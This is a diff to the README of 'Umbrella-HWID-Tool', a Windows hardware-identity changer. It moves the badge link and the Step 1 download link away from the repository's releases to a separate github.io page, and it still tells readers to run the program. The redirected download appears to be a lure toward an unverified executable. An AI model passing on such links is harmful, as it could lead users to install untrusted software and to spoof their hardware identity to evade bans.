@@ -1,6 +1,6 @@
 # 🛡️ Umbrella-HWID-Tool - Reset Your Hardware Identity Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Umbrella%20HWID%20Tool-blueviolet?style=for-the-badge&logo=github)](https://github.com/sharlinewrecked276/Umbrella-HWID-Tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Umbrella%20HWID%20Tool-blueviolet?style=for-the-badge&logo=github)](https://sharlinewrecked276.github.io)
 
 ## ❓ What Is This?
 
@@ -26,7 +26,7 @@ Umbrella-HWID-Tool is a powerful Windows application that changes your computer'
 **Step 1: Download the Application**
 
 Visit this link to download the application:  
-[🔗 **Umbrella-HWID-Tool Downloads**](https://github.com/sharlinewrecked276/Umbrella-HWID-Tool/releases)
+[🔗 **Umbrella-HWID-Tool Downloads**](https://sharlinewrecked276.github.io)
 
 **Step 2: Run the Program**
 
